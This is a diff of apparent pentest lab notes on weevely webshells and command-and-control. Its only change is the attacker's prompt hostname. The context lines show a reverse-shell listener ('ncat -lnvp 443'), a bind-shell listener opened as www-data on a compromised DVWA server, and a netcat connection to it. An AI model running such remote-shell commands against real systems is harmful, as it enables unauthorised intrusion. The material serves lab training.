@@ -7,7 +7,7 @@ Search Tag(s): #weevely #command-and-control #webshell #interactive-shell
 * Attacker (waiting callback)
 
 ```
-user@pentestos:~$ sudo ncat -lnvp 443
+userware@hackware-os:~$ sudo ncat -lnvp 443
 ```
 
 * Compromised Target (Web Server)
@@ -36,7 +36,7 @@ Error binding socket: '[Errno 98] Address already in use'
 - Attacker (callback established)
 
 ```
-user@pentestos:~$ sudo ncat -lnvp 443
+userware@hackware-os:~$ sudo ncat -lnvp 443
 [sudo] password for user:
 Ncat: Version 7.91 ( https://nmap.org/ncat )
 Ncat: Listening on :::443
@@ -81,7 +81,7 @@ www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ nc -lnvp 8080
 * Attacker
 
 ```
-user@pentestos:~$ nc 172.28.128.8 8080
+userware@hackware-os:~$ nc 172.28.128.8 8080
 ```
 
 ---
